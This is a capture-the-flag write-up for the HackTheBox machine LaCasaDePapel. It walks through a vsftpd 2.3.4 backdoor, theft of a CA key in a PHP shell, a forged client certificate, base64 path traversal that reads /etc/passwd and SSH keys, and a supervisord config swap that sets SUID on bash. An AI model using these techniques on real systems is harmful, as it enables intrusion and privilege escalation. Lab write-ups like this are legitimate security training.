---
title: LaCasaDePapel
description: LaCasaDePapel box from HackTheBox write up.
---

# LaCasaDePapel

## Nmap

Time for the typical Nmap scan, let's see what we find:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate=1000 10.10.10.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 19:33 CET
Nmap scan report for 10.10.10.131
Host is up (0.060s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
80/tcp   open     http
443/tcp  open     https
6200/tcp filtered lm-x

Nmap done: 1 IP address (1 host up) scanned in 74.87 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -p21,22,80,443,6200 -sC -sV 10.10.10.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 19:36 CET
Nmap scan report for 10.10.10.131
Host is up (0.12s latency).

PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 2.3.4
22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)
|   256 41e495a3390b25f9dadebe6adc59486d (ECDSA)
|_  256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)
80/tcp   open     http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp  open     ssl/http Node.js Express framework
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: La Casa De Papel
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
6200/tcp filtered lm-x
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.74 seconds
```

I will start testing if I can access the FTP service and then explore the web server, remember to add `lacasadepapel.htb` to the host file!

## FTP

First of all, since I know the version of this service let's see if there are exploits available:

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                           | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                              | unix/remote/17491.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Well I guess that yes they are, let's try to use this backdoor then:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/LaCasaDePapel]
└─$ python ftp.py 10.10.10.131
Success, shell opened
Send `exit` to quit shell
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
ls
Variables: $tokyo
```

We are now in a pretty limited yet interesting shell as `dali`. That `ls` command showed a variable called `tokyo`, and trying to get a bit more about it I got something interesting (I learnt about how to use the shell with the `help` command btw):

```php-inline
show $tokyo
  > 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }
```

Looks like a way of getting a user cert, probably for the website. I will collect the CA private key for later.

```php
sudo file_get_contents('/home/nairobi/ca.key')
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```

I tried to both execute system commands or get the SSH keys for some of the other users using PHP but no luck.

## Website

Accesing the site using `http` is pretty useless. I mean, maybe you can do something with the QR code and the authenticator token but I found nothing. However, when connecting to the server through `https` we get an error telling us that we need a client certificate. I guess is googling time because my knowledge here is pretty limite to be honest.

First, we will need to get the requirements for our client cert:

```bash
┌──(kali㉿kali)-[~]
└─$ openssl s_client -connect 10.10.10.131:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify return:1
---
Certificate chain
 0 s:CN = lacasadepapel.htb, O = La Casa De Papel
   i:CN = lacasadepapel.htb, O = La Casa De Papel
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Jan 27 08:35:30 2019 GMT; NotAfter: Jan 24 08:35:30 2029 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
-----END CERTIFICATE-----
subject=CN = lacasadepapel.htb, O = La Casa De Papel
issuer=CN = lacasadepapel.htb, O = La Casa De Papel
---
Acceptable client certificate CA names
CN = lacasadepapel.htb, O = La Casa De Papel
Client Certificate Types: RSA sign, DSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Peer signing digest: SHA512
Peer signature type: RSA
Server Temp Key: ECDH, prime256v1, 256 bits
---
SSL handshake has read 1537 bytes and written 561 bytes
Verification error: self-signed certificate
---
...
---
```

Cool, now we know a bit about how to fill the different fields in the certificate generation process. Using the CA key we found before we can obtain a valid client certificate to connect:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/LaCasaDePapel/client_cert]
└─$ openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out csr.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:                
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

┌──(kali㉿kali)-[~/Documents/HTB/LaCasaDePapel/client_cert]
└─$ openssl pkcs12 -export -in csr.pem -inkey ca.key -out client.p12
Enter Export Password:
Verifying - Enter Export Password:
```

The last step is to import it into our browser and we should be able to access the "private" section of the page.

Looks like it is for downloading the show, cool but now what we want. Checking a bit more I got path traversal, using this: `https://lacasadepapel.htb/?path=../../../../` I was able to see the contents in `/`. The problem is that I cannot read files this way, but the page was allowing me to download the show chapters from something like `https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp`... wait a moment is that base64?

```
U0VBU09OLTEvMDEuYXZp --> SEASON-1/01.avi
```

Huh, encoding `../../../../../etc/passwd` in base64 I was able to get the `/etc/passwd` file from `https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D`:

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin
memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
```

Now, what can we do with this? Well after some minutes I found that I have access to `berlin` SSH key so I can download it using `https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E%3D` as the URL.

Bad news? Well The private key was not working... checking the `authorized_keys ` revealed that this was not the key for this user sadly. Time to try with another I guess:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/LaCasaDePapel]
└─$ ssh professor@10.10.10.131 -i id_rsa

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$
```

Cool! Time to play inside the machine.

## Pwned!

### User flag

Well something I noticed, looks like I cannot get the first flag in `/home/berlin/user.txt`. Checking the processes running and the ports listening... I guess I know why.

```bash
lacasadepapel [~]$ netstat -ltpn
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -

```

```bash
lacasadepapel [~]$ ps
PID   USER     TIME  COMMAND
...
 3261 dali      0:00 /usr/bin/node /home/dali/server.js
 3262 nobody    3:45 /usr/bin/node /home/oslo/server.js
 3263 berlin    0:00 /usr/bin/node /home/berlin/server.js
 3264 nobody    0:34 /usr/bin/node /home/nairobi/server.js
 ...
 6010 dali      0:00 php /usr/bin/psysh
```

To read the first flag, I guess I can just do it from the webserver since it is running as `berlin`: `https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ`. 

### Root flag

Using Pspy, I noticed that `/home/professor/memcached.js` was being run by the user `nobody` every minute or so.

```
2023/01/17 21:28:02 CMD: UID=65534 PID=14621  | /usr/bin/node /home/professor/memcached.js
```

Also, the file `/home/professor/memcached.ini` got my attention:

```
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

According with the documentation I saw and also some of the Pspy output, looks like `supervisord` is executing the command in `memcached.ini` as `root`. We cannot really modify the file to execute whatever we want but we can do something, yeah the file is not ours but the directory is owned by our user. We can just move the original file away and create another one with the same name with something like:

```
[program:memcached]
command = sudo chmod u+s /bin/bash
```

After waiting a bit, the `bash` binary transformed to a SUID binary and the machine is pwned!

```bash
lacasadepapel [~]$ /bin/bash -p
lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) euid=0(root) groups=1002(professor)
```
